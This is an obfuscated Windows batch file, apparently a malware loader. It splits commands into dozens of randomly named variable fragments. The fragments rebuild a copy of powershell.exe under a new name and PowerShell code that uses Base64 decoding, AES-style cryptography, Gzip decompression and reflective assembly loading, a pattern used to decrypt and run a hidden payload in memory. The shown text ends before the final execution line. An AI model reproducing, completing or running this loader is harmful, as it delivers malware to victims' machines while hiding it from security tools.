@echo off
set "TeqdKafRpU=po"
set "OpSVjBrdUo=rS"
set "gGgXtPMaHy=nd"
set "QBjnnhWmRp=\W"
set "PVYFqpuFIw=Sy"
set "iyInSkgRJl=ow"
set "LKTVVcnRrW=py"
set "XXrdiEqJVj=st"
set "IVvDTsIeXL=1."
set "mRPcdUfbPC=ll"
set "CmWAjLzsbd=0\"
set "cpsOpGOmXt= /"
set "dvDKJmzdXD=32"
set "YoBttBtHtW=do"
set "VADblKXZCq=:\"
set "CdPAUgImNQ=ll"
set "EZFykGmsFY=\v"
set "eJfRjFrIQw= C"
set "WaCQNNpFPg=xe"
set "eZMygSqfeo=em"
set "OdwnSQjAyx=in"
set "mcoMvSiSVP=y "
set "xDpbordepz=rs"
set "fmMssDPzkY=ws"
set "ySSQezgzJN=co"
set "hTrBfEErTS=he"
set "HHhUKHHlHB=we"
set "doLzFpPoPs=.e"
set "WeoOAZZqST=Po"
set "cZWNulQvJl=Wi"
set "cYEzFCZPTM=we"
set "enpaTeMrwX=s\"
set "aKpABTaMTt=he"
set "EJHtegCMXs= %~dp0"
set "PmsNbdegIN=cd"
set "uVIpOHfohr=em.C"
set "LfiPMMgRlb=rEo "
set "NSdGIZJhNf=[]] "
set "HaFupyVuXu=K = "
set "JGLtZxUdvg=m(, "
set "XJuqVvvrvn=-joi"
set "SlATzaclmy=null"
set "iNZfRyBOsh=y.Pa"
set "pgPKaJfyIj=.Cop"
set "LvxthSbbnj=.Cre"
set "jCIwMaQFcf=pose"
set "mTraaOctvB=;$pJ"
set "bWzSgalnYc= = $"
set "VOEWiTKTCN=pher"
set "NNnmWtbxkY=ring"
set "bLfsqUZkjk=Sdyi"
set "eYiCrDHlQl=[Sys"
set "SqSuFyQdcb= if "
set "YeieIRUECP=tsWi"
set "yUnmKjRQEj=);$C"
set "NeFZmgcGkq=y.Cr"
set "zfGeAanfJB='[-1"
set "ygulNjlHya=[-1."
set "gpOIKrOkqc=)($S"
set "iuWoabaCJH=[Sys"
set "gLxHiEKpXO=;$ty"
set "rVtukTuIOz=Bg.D"
set "hqumyTXpFb=736u"
set "HACgsHltrm= = $"
set "pyjJdCwcrE=hy.A"
set "bMcIJZxpWC=neP."
set "aHzutRnrDp=::De"
set "eLzJGndcNy=1..-"
set "ZWDuVGpGju=[Env"
set "qdEKgDJBWI=ptog"
set "lKYIpFQWuZ= = ["
set "VADSzrovkf=ptor"
set "FoDcHGRkLI=-1.."
set "NbizEkHtaq=..-1"
set "wwTBLPikgY=NzPW"
set "ZprKsYMxah=eam("
set "kYDpQDnuWr=ptog"
set "yAetPQXhqA===')"
set "AVMthgAoQA=$NzP"
set "qYobBbjOVG=($Kh"
set "nmQOFbgybF=Sdyi"
set "BAtPIdHbFF=m.IO"
set "IBMUCYmuvT= = N"
set "OmCiZmWlZR=$Sdy"
set "EABqvPkBnB=tS46"
set "gLIndhjTvY=urit"
set "DycMYPqoFE=DpHX"
set "kQPNWLitpw=Fo7l"
set "XHRxKYENwf=stem"
set "NWgiLeAgKR=rt]:"
set "iMGjhcYwVH=Obje"
set "xTBUNqneoQ= [Sy"
set "KcvjBQmLbp=rity"
set "aFGIMsvWOD=vert"
set "vOiaViBGyL=.IO."
set "qMvykZDsCb=oin "
set "MSQUrbplfp=jyGB"
set "YchQnOPTVH=0O+g"
set "WxlkUrayiQ=o.En"
set "OkiworPzyk=brea"
set "VPrnJDtrLp=Stre"
set "mgHQvydvRh=tem."
set "uiefcmutRm=pose"
set "UeSNpFPPyV=Disp"
set "AEXOZOMdme=();$"
set "cKfCXowkPG=flec"
set "RfsxvGjQGd=;$pJ"
set "XRSOgQGprs=m.IO"
set "AJBJDRqhwp=pStr"
set "EyEZttOgsR=).Sp"
set "wmKJwkEFkJ=BC;$"
set "sdmaJWbLAq=rans"
set "KbgTJHxMku=Sdyi"
set "MvehmNSalU=x.Su"
set "eislsIRgcB=trea"
